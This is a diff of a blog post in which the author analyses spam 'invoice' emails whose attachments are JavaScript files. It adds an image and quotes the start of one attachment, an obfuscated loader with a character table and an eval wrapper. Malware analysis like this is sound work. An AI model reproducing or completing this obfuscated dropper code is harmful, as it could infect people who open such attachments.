@@ -7,7 +7,11 @@ published: True
 
 ---
 
-So my abandoned email address was recently spammed with a lot of "invoices" that I did not pay. Each "invoice" is a JavaScript file that looks like this:
+So my abandoned email address was recently spammed with a lot of "invoices" that I did not pay. 
+
+![invoices](/assets/invoices.png)
+
+Each "invoice" is a JavaScript file that looks like this:
 
 {% highlight js %}
 var UdpJBNrcsNApR=[];for(wNNrUTG=(-840+840)/419;wNNrUTG<(14733+499)/119;wNNrUTG++){UdpJBNrcsNApR[wNNrUTG]=String.fromCharCode(wNNrUTG)}function TRbfH(RnyFtbnscoR,dWlUzxYAmCDrq,jVSHyhVl){kfgB=parseInt(RnyFtbnscoR,dWlUzxYAmCDrq);uPvuf=kfgB.toString(jVSHyhVl);return uPvuf;}function IMnKyzGDgNtoqZM(eOQyFMPlBvYVXxifI){eval(eOQyFMPlBvYVXxifI)}
